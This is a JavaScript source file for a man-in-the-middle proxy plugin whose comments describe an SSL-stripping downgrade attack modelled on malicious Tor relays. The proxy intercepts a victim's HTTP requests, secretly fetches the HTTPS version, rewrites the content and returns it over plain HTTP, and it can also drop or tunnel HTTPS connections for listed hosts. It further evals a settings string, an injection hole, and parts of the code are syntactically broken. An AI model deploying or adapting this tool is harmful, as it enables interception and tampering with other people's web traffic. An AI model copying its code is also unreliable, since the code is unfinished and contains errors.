// run with arg `test` to open a local proxy
// trying a downgrade attack similar to:
//  https://medium.com/@nusenu/how-malicious-tor-relays-are-exploiting-users-in-2020-part-i-1097575c0cac
// when user attempts to go to https website we will inject a 301 redirect to HTTP
/*

  We will need to setup a connection to the target as a client and then forward traffic back through http to our victum

*/
//const iptables = require('./lib/iptables.js');
//const inherits = require('util').inherits;
//const { filter } = require('async');
const Proxy = require('http-mitm-proxy');
const net = require('net');
const { Buffer } = require('buffer');
const https = require('https');
const plugins = require('plugins');


//
// Monster-In-The-Middle plugin defintion
//
// should have a view for start stop and log and config all in one
export.settings = {};
var plugin_name = 'intercept';
exports.plugin = {
  name: plugin_name,
  description: '',
  menuname: 'HTTP/S Intercept',
  submenus: [
    {'start':  () => exports.init()  },
    {'stop':   () => exports.stop() },
    {'pause':  () => exports.pause() },
    {'exit':   () => exports.close() },
    {'log':    () => exports.show_log() },
    {'settings':    () => exports.show_log() },
  ],
  get_settings: () => {
    // get config from the global settings file or else use defaults
    var settings = plugins.get_settings(plugin_name);
    if (settings || Object.keys(settings).length > 0) {
      exports.filters = settings.filters;
      return settings;
    }
    else {
      return {'filters': exports.filters };
    }
  }
  set_settings: string => {
    if (typeof string === 'string') {
      eval(`_tmp=${string}`);
      exports.settings = _tmp;
    }
    else {
      exports.settings = string; 
    }
    // save the settings to file
    plugin.set_settings(exports.settings)
  }
}
 

// using https://github.com/joeferner/node-http-mitm-proxy#readme


var port = 8080;
var proxy = Proxy();


/*
 * Filters
 * 
 * Types:
 * - Modify http request body
 *    This type assumed when.......TODO.........
 * - Modify http 301 redirect to HTTPS request
 *    Instead of redirect we will drop the 301 (not allow header to return) 
 *    and respond to requests and forward them to the 301 destination, and 
 *    then attempt to modify content in transit between the two.
 * - Drop http 301 and force requests to HTTP
 *    This assumes the server will 
 */
// Note that target host/ips can only have one filter
exports.settings.filters = [
  // this rule 
  //  1. trigger on request to http://nathafain.com , 
  //  2. ignore possible 301 redirect, 
  //  3. secretly send request to https://nathanfain.com, 
  //  4. modify the response from https and return that over http
  {     dsthosts: [ 'nathanfain.com' ],
      urlreplace: [ 'https://nathanfain.com' ], // on dsthosts[N], drop and request urlreplace[N]+urlpath instead
   bodytransform: body => body.toString('utf-8').toUpperCase(),
           debug: true,
           // drop: true, // drop will then *not* send any data in response to client request
        },

  // this rule
  //  1. drop all requests to https://nathanfain.com
  //  this could be effective when assuming there is a 301 on http but the client would continue to request to http of the 301 fails. this condition is unlikely and I could only imagine it happening on a http->https upgrade attempt on a badly programmed app
  // { dsthosts: [ 'nathanfain.com:443'],
  //       drop: true, },

  // this rule
  //  1. attempt to modify the initial http version
  // its a failed attempt to see how far we can play with https proxying
  // currently this form of replacement does not work for HTTPS:
  // these filters *can* be used to drop https requests
  {     dsthosts: [ 'nathanfain.com:443' ],
   bodytransform: body => body.toString('utf-8').replace(/http\/1\.1/gi, 'http/1.2'),
           debug: true, },

  {     dsthosts: [ 'localhost:443' ],
   bodytransform: body => body.toString('utf-8').replace(/http 1\.1/gi, 'http 1.2'),
           // drop: true 
           debug: true, },

  //
  {     dsthosts: [ 'cryptomixer1.com' ],
           debug: true,
   bodytransform: body => body.toString('utf-8').replace(/301 Moved Permanently/g, '200')  },

  {     dsthosts: [ 'cryptomixer1.com:443' ], 
            drop: true },
]


// these values are populated just used to more quickly check for hosts and are opulated by functions
exports.filters_hosts = []; // array of all host names found
exports.filters_index = {}; // reverse map of {'hostname':#} to its index number in filters_hosts[]
exports.update_filters_hosts = update_filters_hosts() {
  exports.filters_hosts = exports.settings.filters.map(f => f.dsthosts).flat();
  exports.settings.filters.forEach( (f, index) => {
    f.dsthosts.forEach(host => {
      exports.filters_index[host] = index;
    });
  });
}
exports.get_filters = () => exports.settings.filters;
exports.set_filters = _filters => {
  exports.settings.filters = _filters;
  exports.update_filters_hosts();
}
// call once on load
exports.update_filters_hosts();


proxy.onError(function(ctx, err) {
  console.error('proxy error:', err);
});

proxy.onRequest(function(ctx, callback) {
  console.log('onRequest (http)', ctx.clientToProxyRequest.headers.host, ctx.clientToProxyRequest.url)
//  console.log(ctx.clientToProxyRequest.headers)
//  console.log(ctx.clientToProxyRequest.rawHeaders)
//  console.log(ctx.clientToProxyRequest.url)
//  console.log(ctx.clientToProxyRequest.socket._sockname)
//  console.log(ctx.clientToProxyRequest.socket._peername)
//  console.log()
//  console.log(ctx.proxyToClientResponse.socket._sockname)
//  console.log(ctx.proxyToClientResponse.socket._peername)
  
//  console.log(require('util').inspect(ctx, showHidden=true, depth=12, colorize=true));

  if ( exports.filters_hosts.indexOf(ctx.clientToProxyRequest.headers.host) >= 0)
  {
    var _i = exports.filters_index[ctx.clientToProxyRequest.headers.host]
    var filter = exports.settings.filters[_i]
    console.log('filter',filter)
    // URLreplace is used to prevent 301 redirect from http to https
    // we will make the request secretly and return content back over http
    if (filter.hasOwnProperty('urlreplace')) {
      var _idx = filter.dsthosts.indexOf(ctx.clientToProxyRequest.headers.host)
      urlreplace = filter.urlreplace[_idx] + ctx.clientToProxyRequest.url
      console.log(urlreplace, _idx)
      https.get(urlreplace, (res) => {
        console.log('statusCode:', res.statusCode);
        console.log('headers:', res.headers);
        var chunks = [];
        res.on('data', chunk => chunks.push(chunk)); // data is encrypted
        res.on('end', () => { 
          var body = Buffer.concat(chunks)
          if (filter.hasOwnProperty('bodytransform')) {
              body = filter.bodytransform(body)
          }

          if (filter.drop)
            ctx.proxyToClientResponse.socket.destroy(); //end() would send a FIN packet
          else
            ctx.proxyToClientResponse.end(body);

          if (filter.debug)
            console.log( body ) 
        } )

      }).on('error', (e) => {
        console.error(e);
      });
    }
    // Is not urlreplace which indicates this filter intends to just change content of http request and return
    else {
      var chunks = [];

      ctx.onResponseData(function(ctx, chunk, callback) {
        chunks.push(chunk);
        return callback(null, null); // don't write chunks to client response
      });
      ctx.onResponseEnd(function(ctx, callback) {
        var body = Buffer.concat(chunks);
        if (filter.hasOwnProperty('bodytransform')) {
          body = filter.bodytransform(body)
        }

        if (filter.drop)
          ctx.proxyToClientResponse.socket.end();
        else
          ctx.proxyToClientResponse.write(body);

        if (filter.debug)
          console.log( body ) 

        return callback();
      });

    }
  }
});
proxy.onConnect(function(req, client_to_proxy_socket, head) {
  console.log('onConnect (https)',req.headers.host)
  if ( exports.filters_hosts.indexOf(req.headers.host) >= 0)
  {

    var _findx = exports.filters_index[req.headers.host]
    var filter = exports.settings.filters[_findx]
    console.log('filter',filter)
   
    if (filter.drop) {
      client_to_proxy_socket.destroy(); //end() would send a FIN packet supposedly
      return;
    }
    var host = req.url.split(":")[0];
    var port = req.url.split(":")[1];
  
    console.log('Tunnel to', req.url);
    var proxy_to_server_socket = net.connect({
      port: port,
      host: host,
      allowHalfOpen: true
    }, function(){
      proxy_to_server_socket.on('finish', () => {
        client_to_proxy_socket.destroy();
      });
      
      // The following form of collecting data is not used and instead we are currently
      // using socket pipes below this section
      /*
      var chunks = [];
      var buffer;
      proxy_to_server_socket.on('data', chunk => {console.log('.');chunks.push(chunk)}); // data is encrypted
      proxy_to_server_socket.on('end', () => { 
        buffer = Buffer.concat(chunks)
        if (filter.hasOwnProperty('bodytransform')) {
          buffer = filter.bodytransform(buffer)
        }
        if (filter.debug)
          console.log( buffer.toString('utf-8') ) 
        client_to_proxy_socket.write(buffer);
        // client_to_proxy_socket.write('HTTP/1.1 200 OK\r\n\r\n'+buffer.toString('utf-8'), 'UTF-8');
  
      });
      */
      client_to_proxy_socket.on('close', () => {
        proxy_to_server_socket.end();
      });

      // https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
      // client_to_proxy_socket.write('HTTP/1.1 301 OK\r\nLocation: http://'+host+'\r\n\r\n', 'UTF-8', function(){ // Moved Permanently
      client_to_proxy_socket.write('HTTP/1.1 200 OK\r\n\r\n', 'UTF-8', function(){
        // TODO: if we want to modify SSL encrypted data in transit we will
        //       have to reintroduce the Upperstream pipes
        proxy_to_server_socket.pipe(client_to_proxy_socket);
        // proxy_to_server_socket.pipe(new UpperStream()).pipe(client_to_proxy_socket)
        client_to_proxy_socket.pipe(proxy_to_server_socket);
          
      });
    });
  
    proxy_to_server_socket.on('error', function(err) {
      filterSocketConnReset(err, 'PROXY_TO_SERVER_SOCKET');
    });
    client_to_proxy_socket.on('error', function(err) {
      filterSocketConnReset(err, 'CLIENT_TO_PROXY_SOCKET');
    });
  }
    
  // console.log("### REQ")
  // console.log(require('util').inspect(req, showHidden=true, depth=12, colorize=false));
  // console.log("### SOCKET")
  // console.log(require('util').inspect(socket, showHidden=true, depth=12, colorize=false));
  // console.log("### HEAD")
  // console.log(require('util').inspect(head, showHidden=true, depth=12, colorize=false));
});


// Since node 0.9.9, ECONNRESET on sockets are no longer hidden
function filterSocketConnReset(err, socketDescription) {
  if (err.errno === 'ECONNRESET') {
    console.log('Got ECONNRESET on ' + socketDescription + ', ignoring.');
  } else {
    console.log('Got unexpected error on ' + socketDescription, err);
  }
}

function init (cb) {
  proxy.listen({port: port}, function() {
    console.log('Proxy server listening on ' + port);
    if (typeof cb === 'function')
      cb();
  });
};  
exports.init = init;
exports.close = () => proxy.close();



function test () {
  var cmd = `curl -x http://localhost:${port} http://nocompany.co/ | grep body`;
  console.log('> ' + cmd);
  require('child_process').exec(cmd, function (error, stdout, stderr) {
    if (error) {
      console.error(`exec error: ${error}`);
      return;
    }
    console.log(`${stdout}`);
    // proxy.close();
  });
}


if (process.argv.length > 2) {
  if (process.argv[2] == 'init')
    init()
  else if (process.argv[2] == 'test')
    init(test)
}




/*
curl -v -x 'http://localhost:8080' http://nocompany.co
*/


/*
function UpperStream() {
  TransformStream.call(this);
}
inherits(UpperStream, TransformStream);
UpperStream.prototype._transform = function(chunk, encoding, cb) {
  console.log('.')
  for (var i = 0; i < chunk.length; ++i) {
    var ch = chunk[i];
    // console.log(ch)
    // Check for lowercase character
    // if (ch >= 97 && ch <= 122) {
    //   // Make it uppercase
    //   chunk[i] &= ~32;
    // }
    if (ch == 66 ) {
      console.log("B?")
      // chunk[i] = 98;
    }
  }
  cb(null, chunk);
};
*/